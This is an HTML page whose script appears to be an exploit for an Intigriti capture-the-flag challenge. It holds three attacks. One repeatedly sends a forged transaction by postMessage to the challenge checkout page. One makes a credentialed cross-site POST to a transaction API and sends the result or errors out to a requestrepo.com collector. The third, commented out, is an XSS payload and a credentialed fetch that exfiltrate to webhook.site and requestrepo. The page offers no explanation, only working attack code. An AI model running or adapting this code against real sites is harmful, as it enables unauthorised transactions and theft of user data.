<html>
<body>
    <script>        
        //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';

        const win = window.open("https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000", "_blank");
        const payload = {
        type: "submitTransaction",
        transaction: {
            toAddress: 'xssishere',
            currency: 'XMR',
            amount: 1111
        }
    };

    setInterval(() => {
        if (win) {
            console.log("Sending payload...");
            win.postMessage(payload, "*");
            fetch(`https://we6hfxdk.requestrepo.com?status=sent`);
        }
    }, 1000);
        
    async function executeAttack() {
        try {
            const response = await fetch('https://localhost:8080/api/transaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                credentials: 'include',
                body: JSON.stringify({
                    "toAddress": "1afefa17653da6df5ebeb45947b91262d3",
                    "currency": "1337COIN",
                    "amount": 1
                })
            });
            
            const result = await response.json();
            
            await fetch('https://we6hfxdk.requestrepo.com/?data=' + 
                       encodeURIComponent(JSON.stringify(result)));
            
        } catch (error) {
            await fetch('https://we6hfxdk.requestrepo.com/?error=' + 
                       encodeURIComponent(error.message));
        }
    }
    
    executeAttack();      

// fetch('https://challenge-0126.intigriti.io/api/marketwatch',  {
//   method: "GET",
//   credentials: "include"
// })
//   .then(response => response.text()) 
//   .then(data => {
//     fetch('https://we6hfxdk.requestrepo.com/?dd=' + encodeURIComponent(data));
//   })
//   .catch(error => {
//     fetch('https://we6hfxdk.requestrepo.com/?error=' + encodeURIComponent(error.message));
//   });
        
    </script>
</body>
</html>
